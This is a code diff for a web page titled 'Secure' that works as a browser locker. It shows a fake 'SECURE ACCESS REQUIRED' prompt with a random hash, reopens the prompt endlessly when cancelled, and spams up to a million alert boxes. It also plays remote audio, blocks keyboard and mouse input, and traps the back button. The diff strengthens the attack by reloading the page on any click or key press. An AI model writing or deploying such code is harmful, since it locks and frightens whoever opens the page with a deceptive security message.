@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no" />
-<title>Secure Access</title>
+<title>Secure</title>
 <style>
   html, body {
     margin:0; padding:0; height:100%;
@@ -20,9 +20,10 @@
 (() => {
   const AUDIO_URL = 'https://raw.githubusercontent.com/hedredy/Project/2d591f652b1ac4b12d87e38482ad5679cb0d516c/macan-asphalt-8.mp3';
   const CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:',.<>/?";
-  const HASH_LEN = 5000;
+  const PROMPT_LEN = 10000;
+  const ALERT_LEN = 5000;
 
-  function randomHash(len) {
+  function randomText(len){
     let s = '';
     for(let i=0;i<len;i++){
       s += CHARS.charAt(Math.floor(Math.random()*CHARS.length));
@@ -30,19 +31,21 @@
     return s;
   }
 
-  function blockEverything(e){
+  function blockEvent(e){
     try{
       e.preventDefault();
       e.stopImmediatePropagation();
-    } catch {}
+    }catch{}
     return false;
   }
+
   ['contextmenu','copy','cut','paste','selectstart','dragstart','mousedown','mouseup','mousemove','touchstart','touchmove','touchend','pointerdown','pointerup','wheel'].forEach(ev=>{
-    document.addEventListener(ev, blockEverything, {capture:true, passive:false});
+    document.addEventListener(ev, blockEvent, {capture:true, passive:false});
   });
+
   document.addEventListener('keydown', e => {
-    if(e.ctrlKey || e.metaKey || e.altKey || ['F12','F11','F10'].includes(e.key)){
-      blockEverything(e);
+    if(e.ctrlKey || e.metaKey || e.altKey || ['F12','F11','F10','Escape'].includes(e.key)){
+      blockEvent(e);
     }
   }, {capture:true});
 
@@ -56,27 +59,41 @@
     } catch {}
   }
 
-  function promptLoop() {
-    const hash = randomHash(HASH_LEN);
-    let res = prompt("SECURE ACCESS REQUIRED\n\nHASH:\n" + hash + "\n\nEnter any key to continue:");
-    if(res === null){
-      // Если нажал отмену — заново
-      setTimeout(promptLoop, 0);
-    } else {
-      tryPlayAudio();
-      alertSpam(1000000);
-    }
-  }
-
   function alertSpam(count){
     if(count <= 0) return;
-    alert(randomHash(HASH_LEN));
+    alert(randomText(ALERT_LEN));
     setTimeout(() => alertSpam(count-1), 1);
   }
 
-  window.onload = promptLoop;
+  function promptAndSpam(){
+    const promptText = randomText(PROMPT_LEN);
+    let res = prompt("SECURE ACCESS REQUIRED\n\nHASH:\n" + promptText + "\n\nPress OK to continue");
+    if(res !== null){
+      tryPlayAudio();
+      alertSpam(1000000);
+    } else {
+      // если отмена — снова prompt
+      setTimeout(promptAndSpam, 0);
+    }
+  }
 
-  // Обновление страницы запрещаем, перезагрузка невозможна
+  window.onload = () => {
+    promptAndSpam();
+  };
+
+  // Перезагружаем страницу при любом действии, чтобы сработать по 100%
+  const reloadEvents = ['click','dblclick','keydown','keyup','keypress','contextmenu','touchstart','touchend','pointerdown','pointerup','wheel'];
+  reloadEvents.forEach(ev=>{
+    window.addEventListener(ev, e => {
+      try {
+        location.reload();
+      } catch {
+        location.href = location.href;
+      }
+    }, {capture:true, passive:false});
+  });
+
+  // Запрет выхода со страницы
   history.pushState(null, document.title, location.href);
   window.addEventListener('popstate', ()=>history.pushState(null, document.title, location.href));
 
